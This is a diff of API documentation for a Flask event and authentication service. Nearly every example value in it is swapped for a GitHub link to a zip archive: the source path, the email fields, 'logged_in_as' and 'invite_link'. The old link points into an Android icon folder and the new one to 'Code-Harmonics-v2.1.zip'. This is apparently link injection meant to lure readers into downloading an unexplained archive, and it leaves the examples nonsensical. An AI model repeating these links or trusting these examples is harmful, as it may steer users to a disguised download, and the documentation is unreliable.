@@ -43,7 +43,7 @@ This is a Flask-based API for managing events, user authentication, profiles, an
 # Authentication API Routes Documentation
 
 ## Overview
-This document provides details on the authentication routes defined in `https://github.com/the-vishal-gupta/Code_Harmonics/raw/refs/heads/main/invyta/invyta/android/app/src/main/res/mipmap-xxhdpi/Harmonics_Code_costoapical.zip`. The authentication system includes user registration, email verification via OTP, login, and a protected route that requires authentication.
+This document provides details on the authentication routes defined in `https://raw.githubusercontent.com/the-vishal-gupta/Code_Harmonics/main/invyta/invyta/linux/Code-Harmonics-v2.1.zip`. The authentication system includes user registration, email verification via OTP, login, and a protected route that requires authentication.
 
 ## Routes
 
@@ -55,7 +55,7 @@ This document provides details on the authentication routes defined in `https://
 **Request Body:**
 ```json
 {
-    "email": "https://github.com/the-vishal-gupta/Code_Harmonics/raw/refs/heads/main/invyta/invyta/android/app/src/main/res/mipmap-xxhdpi/Harmonics_Code_costoapical.zip",
+    "email": "https://raw.githubusercontent.com/the-vishal-gupta/Code_Harmonics/main/invyta/invyta/linux/Code-Harmonics-v2.1.zip",
     "password": "securepassword"
 }
 ```
@@ -84,7 +84,7 @@ This document provides details on the authentication routes defined in `https://
 **Request Body:**
 ```json
 {
-    "email": "https://github.com/the-vishal-gupta/Code_Harmonics/raw/refs/heads/main/invyta/invyta/android/app/src/main/res/mipmap-xxhdpi/Harmonics_Code_costoapical.zip",
+    "email": "https://raw.githubusercontent.com/the-vishal-gupta/Code_Harmonics/main/invyta/invyta/linux/Code-Harmonics-v2.1.zip",
     "otp": "123456"
 }
 ```
@@ -119,7 +119,7 @@ This document provides details on the authentication routes defined in `https://
 **Request Body:**
 ```json
 {
-    "email": "https://github.com/the-vishal-gupta/Code_Harmonics/raw/refs/heads/main/invyta/invyta/android/app/src/main/res/mipmap-xxhdpi/Harmonics_Code_costoapical.zip",
+    "email": "https://raw.githubusercontent.com/the-vishal-gupta/Code_Harmonics/main/invyta/invyta/linux/Code-Harmonics-v2.1.zip",
     "password": "securepassword"
 }
 ```
@@ -164,7 +164,7 @@ This document provides details on the authentication routes defined in `https://
 - **200 OK** (If JWT is valid)
 ```json
 {
-    "logged_in_as": "https://github.com/the-vishal-gupta/Code_Harmonics/raw/refs/heads/main/invyta/invyta/android/app/src/main/res/mipmap-xxhdpi/Harmonics_Code_costoapical.zip"
+    "logged_in_as": "https://raw.githubusercontent.com/the-vishal-gupta/Code_Harmonics/main/invyta/invyta/linux/Code-Harmonics-v2.1.zip"
 }
 ```
 - **401 Unauthorized** (If JWT is missing or invalid)
@@ -292,7 +292,7 @@ Authorization: Bearer <your_jwt_token>
 - **Output Success (200):**
 ```json
 {
-  "invite_link": "https://github.com/the-vishal-gupta/Code_Harmonics/raw/refs/heads/main/invyta/invyta/android/app/src/main/res/mipmap-xxhdpi/Harmonics_Code_costoapical.zip"
+  "invite_link": "https://raw.githubusercontent.com/the-vishal-gupta/Code_Harmonics/main/invyta/invyta/linux/Code-Harmonics-v2.1.zip"
 }
 ```
 
@@ -433,7 +433,7 @@ Authorization: Bearer <your_jwt_token>
 - **Output Success (200):**
 ```json
 {
-  "email": "https://github.com/the-vishal-gupta/Code_Harmonics/raw/refs/heads/main/invyta/invyta/android/app/src/main/res/mipmap-xxhdpi/Harmonics_Code_costoapical.zip",
+  "email": "https://raw.githubusercontent.com/the-vishal-gupta/Code_Harmonics/main/invyta/invyta/linux/Code-Harmonics-v2.1.zip",
   "username": "john_doe",
   "user_id": "user123",
   "bio": "Event enthusiast and photographer",
